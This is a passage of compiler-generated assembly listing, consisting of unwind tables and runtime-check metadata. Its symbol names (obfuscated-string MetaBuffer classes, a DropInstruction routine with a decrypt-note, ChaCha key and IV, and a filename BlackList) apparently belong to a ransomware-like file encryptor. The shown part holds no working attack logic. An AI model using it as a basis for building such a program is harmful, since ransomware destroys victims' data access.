	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09d9H
	DW	0a03H
	DW	0a2dH
	DW	0a57H
	DW	0a81H
	DW	0aabH
	DW	0ad5H
	DW	0affH
	DW	0b29H
	DW	0b53H
	DW	0b7dH
	DW	0ba7H
	DW	0bd1H
	DW	0bfbH
	DW	0c25H
	DW	0c4fH
	DW	0c79H
	DW	0ca3H
	DW	0ccdH
	DW	0cf7H
	DW	0d21H
	DW	0d4bH
	DW	0d75H
	DW	0d9fH
	DW	0dc9H
	DW	0df3H
	DW	0e1dH
	DW	0e47H
	DW	0e71H
	DW	0e9bH
	DW	0ec5H
	DW	0eefH
	DW	0f19H
	DW	0f43H
	DW	0f6dH
	DW	0f97H
	DW	0fc1H
	DW	0febH
	DW	01015H
	DW	0103fH
	DW	01069H
	DW	01093H
	DW	010bdH
	DW	010e7H
	DW	01111H
	DW	0113bH
	DW	01165H
	DW	0118fH
	DW	011b9H
	DW	011e3H
	DW	0120dH
	DW	01237H
	DW	01261H
	DW	0128bH
	DW	012b5H
	DW	012dfH
	DW	012e9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03d1H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	02aeH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 045053d19H
	DD	010e4313H
	DD	070070091H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0470H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$0 DB 046H ; DropInstruction
	DB	069H
	DB	06cH
	DB	065H
	DB	06eH
	DB	061H
	DB	06dH
	DB	065H
	DB	00H
	ORG $+7
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$1 DB 064H ; DropInstruction
	DB	077H
	DB	044H
	DB	065H
	DB	063H
	DB	072H
	DB	079H
	DB	070H
	DB	074H
	DB	04eH
	DB	06fH
	DB	074H
	DB	065H
	DB	00H
	ORG $+2
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$2 DB 043H ; DropInstruction
	DB	072H
	DB	079H
	DB	070H
	DB	074H
	DB	043H
	DB	074H
	DB	078H
	DB	00H
	ORG $+7
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$3 DB 043H ; DropInstruction
	DB	068H
	DB	061H
	DB	043H
	DB	068H
	DB	061H
	DB	04bH
	DB	065H
	DB	079H
	DB	00H
	ORG $+6
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$4 DB 043H ; DropInstruction
	DB	068H
	DB	061H
	DB	043H
	DB	068H
	DB	061H
	DB	049H
	DB	056H
	DB	00H
	ORG $+7
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$5 DB 042H ; DropInstruction
	DB	079H
	DB	074H
	DB	065H
	DB	073H
	DB	057H
	DB	072H
	DB	069H
	DB	074H
	DB	074H
	DB	065H
	DB	06eH
	DB	00H
	ORG $+3
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcVarDesc DD 01e4H ; DropInstruction
	DD	04H
	DQ	FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$5
	DD	01a8H
	DD	08H
	DQ	FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$4
	DD	0168H
	DD	020H
	DQ	FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$3
	DD	0110H
	DD	040H
	DQ	FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$2
	DD	0c4H
	DD	04H
	DQ	FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$1
	DD	068H
	DD	020H
	DQ	FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcName$0
	ORG $+288
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcFrameData DD 06H ; DropInstruction
	DD	00H
	DQ	FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04cdH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03d1H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckFilename@@YAHPEB_W@Z DD 025052c01H
	DD	010e2313H
	DD	07007007bH
	DD	05006H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?CheckFilename@@YAHPEB_W@Z$rtcName$0 DB 042H		; CheckFilename
	DB	06cH
	DB	061H
	DB	063H
	DB	06bH
	DB	04cH
	DB	069H
	DB	073H
	DB	074H
	DB	00H
	ORG $+6
?CheckFilename@@YAHPEB_W@Z$rtcVarDesc DD 030H		; CheckFilename
	DD	040H
	DQ	FLAT:?CheckFilename@@YAHPEB_W@Z$rtcName$0
	ORG $+48
?CheckFilename@@YAHPEB_W@Z$rtcFrameData DD 01H		; CheckFilename
	DD	00H
	DQ	FLAT:?CheckFilename@@YAHPEB_W@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0329H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
